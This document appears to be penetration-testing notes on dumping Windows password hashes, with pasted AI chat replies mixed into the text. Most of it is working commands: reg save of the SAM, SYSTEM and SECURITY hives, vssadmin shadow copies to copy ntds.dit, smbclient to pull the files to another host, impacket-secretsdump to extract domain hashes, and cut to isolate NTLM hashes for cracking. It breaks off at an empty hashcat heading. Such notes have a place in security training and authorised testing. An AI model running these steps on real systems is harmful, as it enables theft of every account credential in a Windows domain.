Here is the text extracted from the image:

## Windows-Password-Extraction-and-Cracking

### Windows Password Extraction and Cracking

### Security Account Manager (SAM) Database Extraction

- The **SAM database stores user password hashes (NTLM, sometimes LM)**. It can be dumped in two modes:
    - **Online:** Requires **SYSTEM privileges or token**
    - **Offline:** Using **SYSTEM and SAM hives or backups**

### Location of SAM database files

- `%Systemroot%\System32\config\SAM`
- `C:\Windows\System32\config\SAM`

---

### Commands to save registry hives for offline extraction

- Change directory to the root of C: drive for easier file management.
    
    `1 cd \`
    
- Create a directory to store the dumped registry hives.
    
    `1 mkdir c:\dumped-hives`
    
- Save the **SAM hive**, which contains password hashes, to a file.
    
    `1 reg save hklm\sam c:\dumped-hives\sam`
    
- Save the **SYSTEM hive**, needed for decryption, to a file.
    
    `1 reg save hklm\system c:\dumped-hives\system`
    
- Save the **SECURITY hive** (optional, sometimes useful).
    
    `1 reg save hklm\security c:\dumped-hives\security`
    

---

The image appears to be a slide or screen from a **tutorial on Windows password extraction and cracking**, specifically focusing on the **Security Account Manager (SAM) database**.

Would you like me to search for more information about the process of SAM database extraction or password cracking?

That's an excellent breakdown of the Windows SAM database extraction process!

The core steps for **offline password hash extraction** from the image are:

1. **Locate the SAM Database Files:**
    - `%Systemroot%\System32\config\SAM`
    - `C:\Windows\System32\config\SAM` (Note: While this is the file location, it is typically locked while Windows is running).
2. **Use `reg save` to Export Registry Hives (Offline Extraction Method):**
    - The `reg save` command is used to copy the registry hives that contain the encrypted data. This typically requires **SYSTEM privileges** or an administrator-level shell.
    - `reg save hklm\sam c:\dumped-hives\sam` (Saves the SAM hive with the password hashes).
    - `reg save hklm\system c:\dumped-hives\system` (Saves the SYSTEM hive, which contains the **SysKey** needed to decrypt the SAM file).
    - `reg save hklm\security c:\dumped-hives\security` (Optional, sometimes used for LSA Secrets).
3. **Cracking:**
    - The extracted SAM and SYSTEM files (hives) can then be processed by specialized password cracking tools (like **Impacket's `secretsdump.py`** or **Hashcat** with a preceding utility like `samdump2` or `mimikatz` to prepare the hash) on a different, typically non-Windows, system to recover the plaintext passwords from the NTLM/LM hashes.

## Using Volume Shadow Copy Service to create snapshot and access files

- **List existing Volume Shadow Copies on the machine.**
    
    `vssadmin List Shadows`
    
- **Create a new Shadow Copy for the C: drive to access locked files.**
    
    `vssadmin create shadow /FOR=C:`
    
- **Verify that the shadow copy has been created.**
    
    `vssadmin List Shadows`
    
- **Create a directory to store the dumped registry hives.**
    
    `mkdir c:\dumped-hives`
    
- **Copy the NTDS.DIT file from the shadow copy to a local folder.**
    
    `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit c:\dumped-hives\ntds.dit`
    
- **Copy the SYSTEM hive from shadow copy, required for decryption.**
    
    `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\dumped-hives\system`
    
- **Optional. Check the shadow copies again.**
    
    `vssadmin List Shadows`
    

## Download dumped files via SMB

- **Connect to remote share to download dump files.**
    
    `smbclient //192.168.1.41/dumped-hives -U administrator`
    
- **Download the NTDS.DIT and SYSTEM hive files.**
    
    `mget ntds.dit system`
    

## Extracting hashes using `impacket-secretsdump`

- **Dump hashes from the Active Directory database using local copies.**
    
    `impacket-secretsdump -system system -ntds ntds.dit LOCAL`
    
- **Output results to a file named `ad_armour`.**
    
    `impacket-secretsdump -system system -ntds ntds.dit LOCAL -outputfile ad_armour`
    

## Extract NTLM hashes from output for cracking

- **Extract NTLM hashes from secretsdump output.**
    
    `cat ad_armour.ntds | cut -d : -f 4 > ad_hashes.txt`
    

## Cracking Active Directory hashes with hashcat

---
